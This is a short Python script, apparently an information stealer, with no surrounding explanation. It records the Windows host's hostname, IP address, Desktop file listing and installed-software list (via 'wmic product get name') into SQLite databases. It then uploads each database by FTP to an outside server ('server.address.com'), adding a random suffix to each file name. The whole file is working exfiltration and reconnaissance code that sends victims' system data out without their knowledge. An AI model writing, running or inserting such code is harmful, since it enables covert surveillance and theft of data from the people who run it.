import ftplib
import socket
import sqlite3
import random
import os
import subprocess

hostname = socket.gethostname()
IPAddress = socket.gethostbyname(hostname)
numbers = "1234567890"

desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
desktoplistdir = os.listdir(desktop)
conn = sqlite3.connect('database.db')
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS data(dataname TEXT, value TEXT)')
c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["hostname", hostname])
c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["ip address", IPAddress])
c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["desktop list directory", str(desktoplistdir)])
conn.commit()
c.close()
conn.close()

session = ftplib.FTP('server.address.com','username', 'password')
file = open('database.db','rb')
randnum = ( ''.join(random.choices(numbers, k=20)))
session.storbinary('STOR database' + randnum + '.db', file)
file.close()
session.quit()

Data = subprocess.check_output(['wmic', 'product', 'get', 'name'], shell=True)
strdt = str(Data)
conn = sqlite3.connect('appdatabase.db')
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS data(dataname TEXT, value TEXT)')
try:
	for i in range(len(strdt)):
		c.execute("INSERT INTO data(dataname, value) VALUES(?, ?)", ["app", strdt.split("\\r\\r\\n")[6:][i]])

except IndexError as e:
        conn.commit()
        c.close()
        conn.close()
        session = ftplib.FTP('server.address.com','username', 'password')
        file = open('appdatabase.db','rb')
        session.storbinary('STOR appdatabase' + randnum + '.db', file)
        file.close()
        session.quit()
